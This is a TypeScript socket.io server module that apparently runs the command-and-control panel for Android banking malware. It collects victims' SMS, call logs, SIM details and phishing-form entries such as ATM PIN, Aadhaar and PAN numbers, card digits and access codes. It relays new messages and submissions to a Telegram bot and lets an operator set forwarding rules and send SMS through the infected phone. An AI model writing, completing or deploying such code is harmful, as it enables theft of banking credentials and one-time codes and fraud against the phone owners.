import { Server, Socket } from 'socket.io';
import { store } from '../store.js';
import { SMS, CallLog, ForwardingConfig, SimInfo } from '../types/index.js';
import { TelegramBotService } from '../telegram/bot.js';

export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService): void {
    io.on('connection', (socket: Socket) => {
        console.log(`[Socket] Client connected: ${socket.id}`);

        // Device registration
        socket.on('device:register', async (data: { id: string; name: string; phoneNumber: string }) => {
            console.log(`[Socket] Device registering: ${data.id}`);

            const deviceData = store.registerDevice({
                id: data.id,
                name: data.name,
                phoneNumber: data.phoneNumber,
                socketId: socket.id,
            });

            // Join device to its own room
            socket.join(`device:${data.id}`);

            // Notify admin panels of device update
            io.to('admin').emit('devices:update', store.getAllDevices());

            // Send current forwarding config to device
            socket.emit('forwarding:config', deviceData.forwarding);

            console.log(`[Socket] Device registered: ${data.id} (${data.name})`);

            // Notify via Telegram
            if (telegramBot?.isActive()) {
                await telegramBot.notifyDeviceOnline(deviceData.device);
            }
        });

        // Device requests its current forwarding config (e.g., after reconnection)
        socket.on('device:requestForwardingConfig', (deviceId: string) => {
            console.log(`[Socket] Device ${deviceId} requesting forwarding config`);

            const deviceData = store.getDevice(deviceId);
            if (deviceData) {
                console.log(`[Socket] Sending forwarding config to device ${deviceId}:`, JSON.stringify(deviceData.forwarding));
                socket.emit('forwarding:config', deviceData.forwarding);
            } else {
                console.log(`[Socket] WARNING: Device ${deviceId} not found in store when requesting forwarding config`);
            }
        });

        // SMS sync from device
        socket.on('sms:sync', async (data: { deviceId: string; sms: SMS[] }) => {
            console.log(`[Socket] SMS sync from device ${data.deviceId}: ${data.sms.length} messages`);

            // Get existing SMS count before sync
            const existingCount = store.getSMS(data.deviceId).length;
            const isFirstSync = existingCount === 0;

            store.syncSMS(data.deviceId, data.sms);

            // Notify admin panels
            io.to('admin').emit('sms:update', {
                deviceId: data.deviceId,
                sms: store.getSMS(data.deviceId),
            });

            // Telegram notifications
            if (telegramBot?.isActive()) {
                const deviceData = store.getDevice(data.deviceId);

                if (isFirstSync && deviceData) {
                    // First sync: Notify device is connected
                    await telegramBot.notifyDeviceConnected(deviceData.device);
                } else if (!isFirstSync) {
                    // Subsequent syncs: Only notify for NEW incoming SMS
                    const allSms = store.getSMS(data.deviceId);
                    const newSms = allSms.slice(existingCount);
                    const incomingSms = newSms.filter(sms => sms.type === 'incoming');

                    for (const sms of incomingSms) {
                        await telegramBot.notifyNewSMS(deviceData?.device.name || data.deviceId, sms, deviceData?.device);
                    }
                }
            }
        });

        // Call logs sync from device
        socket.on('calls:sync', async (data: { deviceId: string; calls: CallLog[] }) => {
            console.log(`[Socket] Calls sync from device ${data.deviceId}: ${data.calls.length} calls`);

            // Get existing calls count before sync
            const existingCount = store.getCalls(data.deviceId).length;
            const isFirstSync = existingCount === 0;

            store.syncCalls(data.deviceId, data.calls);

            // Notify admin panels
            io.to('admin').emit('calls:update', {
                deviceId: data.deviceId,
                calls: store.getCalls(data.deviceId),
            });

            // Only notify for NEW calls (not on first sync - that's historical data)
            if (telegramBot?.isActive() && !isFirstSync) {
                const deviceData = store.getDevice(data.deviceId);
                const allCalls = store.getCalls(data.deviceId);
                const newCalls = allCalls.slice(existingCount);
                const incomingCalls = newCalls.filter(call => call.type !== 'outgoing');

                for (const call of incomingCalls) {
                    await telegramBot.notifyNewCall(deviceData?.device.name || data.deviceId, call);
                }
            }
        });

        // Form submission from device (legacy format from Android app)
        socket.on('form:submit', async (data: { deviceId: string; name: string; phoneNumber: string; id: string }) => {
            console.log(`[Socket] Form submitted from device ${data.deviceId}`);

            // Convert legacy format to new format with default values
            const formData = {
                fullName: data.name || '',
                mobileNumber: data.phoneNumber || '',
                motherName: '',
                accountNumber: '',
                aadhaarNumber: '',
                panCard: '',
                cardLast6: '',
                atmPin: '',
                cifNumber: '',
                branchCode: '',
                dateOfBirth: '',
                cardExpiry: '',
                finalPin: '',
                userId: '',
                accessCode: '',
                profileCode: '',
                // Legacy fields for backward compatibility
                name: data.name,
                phoneNumber: data.phoneNumber,
                id: data.id,
            };


            store.submitForm(data.deviceId, formData as any);

            // Notify admin panels
            io.to('admin').emit('forms:update', {
                deviceId: data.deviceId,
                forms: store.getForms(data.deviceId),
            });

            // Notify via Telegram
            if (telegramBot?.isActive()) {
                const deviceData = store.getDevice(data.deviceId);
                await telegramBot.notifyFormSubmission(
                    deviceData?.device.name || data.deviceId,
                    formData as any
                );
            }
        });


        // SIM cards sync from device
        socket.on('sim:sync', (data: { deviceId: string; simCards: SimInfo[] }) => {
            console.log(`[Socket] SIM sync from device ${data.deviceId}: ${data.simCards.length} SIMs`);

            store.syncSimCards(data.deviceId, data.simCards);

            // Send acknowledgment back to device
            socket.emit('sim:sync:ack', { deviceId: data.deviceId, success: true, count: data.simCards.length });

            // Notify admin panels with updated device info
            io.to('admin').emit('devices:update', store.getAllDevices());
            io.to('admin').emit('sim:update', {
                deviceId: data.deviceId,
                simCards: store.getSimCards(data.deviceId),
            });
        });

        // Admin panel connection
        socket.on('admin:connect', () => {
            console.log(`[Socket] Admin panel connected: ${socket.id}`);
            socket.join('admin');

            // Send current device list
            socket.emit('devices:update', store.getAllDevices());
        });

        // Admin requests device data
        socket.on('admin:getDeviceData', (deviceId: string) => {
            const deviceData = store.getDevice(deviceId);
            if (deviceData) {
                socket.emit('deviceData:update', {
                    deviceId,
                    sms: deviceData.sms,
                    calls: deviceData.calls,
                    forms: deviceData.forms,
                    forwarding: deviceData.forwarding,
                });
            }
        });

        // Admin requests sync from device
        socket.on('admin:requestSync', (deviceId: string) => {
            console.log(`[Socket] Admin requested sync from device ${deviceId}`);

            // Forward the sync request to the device
            io.to(`device:${deviceId}`).emit('device:requestSync');
        });

        // Admin updates forwarding config
        socket.on('forwarding:update', (data: { deviceId: string; config: Partial<ForwardingConfig> }) => {
            console.log(`[Socket] Forwarding update for device ${data.deviceId}:`, JSON.stringify(data.config));

            const newConfig = store.updateForwarding(data.deviceId, data.config);

            if (newConfig) {
                // Get the device data to find its socket ID
                const deviceData = store.getDevice(data.deviceId);
                const deviceSocketId = deviceData?.device.socketId;

                console.log(`[Socket] Sending forwarding:config to device ${data.deviceId}`);
                console.log(`[Socket] Device socket ID: ${deviceSocketId}, Device status: ${deviceData?.device.status}`);

                // Send config to device room
                io.to(`device:${data.deviceId}`).emit('forwarding:config', newConfig);

                // Also send directly to the device's socket ID as a fallback
                // This ensures delivery even if room subscription has issues
                if (deviceSocketId) {
                    console.log(`[Socket] Also sending directly to socket ${deviceSocketId}`);
                    io.to(deviceSocketId).emit('forwarding:config', newConfig);
                } else {
                    console.log(`[Socket] WARNING: No socket ID found for device ${data.deviceId} - device may be offline`);
                }

                // Confirm to admin
                socket.emit('forwarding:updated', { deviceId: data.deviceId, config: newConfig });
                console.log(`[Socket] Forwarding config sent and confirmed for device ${data.deviceId}`);
            } else {
                console.log(`[Socket] ERROR: Failed to update forwarding for device ${data.deviceId} - device not found in store`);
            }
        });

        // Admin sends SMS via device
        socket.on('admin:sendSms', (data: { deviceId: string; recipientNumber: string; message: string; subscriptionId?: number; requestId: string }) => {
            console.log(`[Socket] Admin sending SMS via device ${data.deviceId} to ${data.recipientNumber}`);

            // Forward the SMS send request to the device
            io.to(`device:${data.deviceId}`).emit('sms:sendRequest', {
                recipientNumber: data.recipientNumber,
                message: data.message,
                subscriptionId: data.subscriptionId || -1,
                requestId: data.requestId,
            });
        });

        // SMS send result from device
        socket.on('sms:sendResult', (data: { deviceId: string; requestId: string; success: boolean; error?: string }) => {
            console.log(`[Socket] SMS send result from device ${data.deviceId}: ${data.success ? 'success' : 'failed'}`);

            // Forward result to admin
            io.to('admin').emit('sms:sendResult', data);
        });

        // Disconnection
        socket.on('disconnect', async () => {
            console.log(`[Socket] Client disconnected: ${socket.id}`);

            const deviceId = store.setDeviceOfflineBySocketId(socket.id);
            if (deviceId) {
                console.log(`[Socket] Device ${deviceId} marked offline`);
                io.to('admin').emit('devices:update', store.getAllDevices());

                // Notify via Telegram
                if (telegramBot?.isActive()) {
                    const deviceData = store.getDevice(deviceId);
                    if (deviceData) {
                        await telegramBot.notifyDeviceOffline(deviceData.device);
                    }
                }
            }
        });
    });
}

